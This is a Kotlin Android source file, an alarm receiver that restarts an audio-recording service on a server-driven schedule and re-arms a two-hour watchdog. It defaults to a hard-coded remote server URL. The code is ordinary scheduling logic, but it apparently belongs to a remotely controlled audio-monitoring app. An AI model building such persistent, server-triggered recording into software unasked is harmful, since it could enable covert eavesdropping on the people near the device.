package com.audiostream.client

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import androidx.core.content.ContextCompat

/**
 * AlarmReceiver.kt — Wakes up the AudioRecordService based on server schedule and recurring watchdog.
 */
class AlarmReceiver : BroadcastReceiver() {

    companion object {
        const val EXTRA_ACTION = "com.audiostream.client.ACTION"
        const val EXTRA_SERVER_URL = "com.audiostream.client.SERVER_URL"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.getStringExtra(EXTRA_ACTION) ?: intent.action ?: return
        val prefs = context.getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
        val serverUrl = intent.getStringExtra(EXTRA_SERVER_URL)
            ?: prefs.getString("server_url", "https://audio-steam-server.onrender.com")
            ?: "https://audio-steam-server.onrender.com"

        // If this is the 2-Hour Watchdog check, re-arm the next 2-hour alarm in the chain
        if (action == WatchdogScheduler.ACTION_WATCHDOG_CHECK) {
            WatchdogScheduler.scheduleRecurringWatchdog(context)
        }

        try {
            val serviceIntent = Intent(context, AudioRecordService::class.java).apply {
                this.action = action
                putExtra(AudioRecordService.EXTRA_SERVER_URL, serverUrl)
                putExtra(AudioRecordService.EXTRA_IS_MAIN, false)
            }
            ContextCompat.startForegroundService(context, serviceIntent)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
